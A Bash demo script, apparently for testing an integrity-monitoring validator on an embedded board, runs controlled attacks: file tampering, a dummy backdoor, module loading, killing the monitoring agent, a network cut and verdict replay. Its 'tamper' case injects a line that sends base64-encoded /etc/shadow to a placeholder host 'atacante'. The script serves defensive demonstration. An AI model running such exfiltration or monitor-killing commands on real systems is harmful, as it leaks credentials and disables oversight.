#!/bin/bash
# ATEBEAGLE - ataques controlados para a demonstração (rode NA PLACA, com sudo).
# Cada um deve levar o validador a REVOKED em até 1 ciclo (ou 2,5 ciclos no caso do silêncio).
set -e
case "${1:-}" in
  tamper)     # L2 ALTERED: adultera o binário do workload (trojan)
    echo 'curl -s http://atacante/exfil?d=$(cat /etc/shadow | base64) &' >> /opt/atebeagle/workload.py ;;
  drop)       # L2 UNAUTHORIZED: coloca e executa um binário novo
    cp /bin/true /usr/local/bin/backdoor && /usr/local/bin/backdoor ;;
  delete)     # L2 MISSING: remove um binário da baseline
    mv /usr/local/bin/atebeagle-helper /root/ 2>/dev/null || mv /opt/atebeagle/workload.py /root/ ;;
  module)     # L3 MODULE_NEW: carrega um módulo que não existia no boot
    modprobe -v dummy || modprobe -v loop ;;
  silence)    # Dead man's switch: mata o agente (atacante tentando "calar" o monitor)
    systemctl kill -s SIGKILL atebeagle-agent ;;
  netcut)     # Dead man's switch: corta a rede da placa
    ip link set usb0 down; sleep 200; ip link set usb0 up ;;
  replay)     # Replay: reenvia um veredito antigo capturado (rode no notebook com o JSON salvo)
    curl -s -X POST -H 'Content-Type: application/json' --data @"${2:?veredito.json}" "${3:?http://ip:8700}/verdict"; echo ;;
  restore)    # desfaz tamper/drop
    sed -i '/atacante/d' /opt/atebeagle/workload.py; rm -f /usr/local/bin/backdoor
    mv /root/workload.py /opt/atebeagle/ 2>/dev/null || true ;;
  *) echo "uso: sudo $0 tamper|drop|delete|module|silence|netcut|replay|restore"; exit 1 ;;
esac
echo "ataque '$1' executado. Olhe o painel do validador."
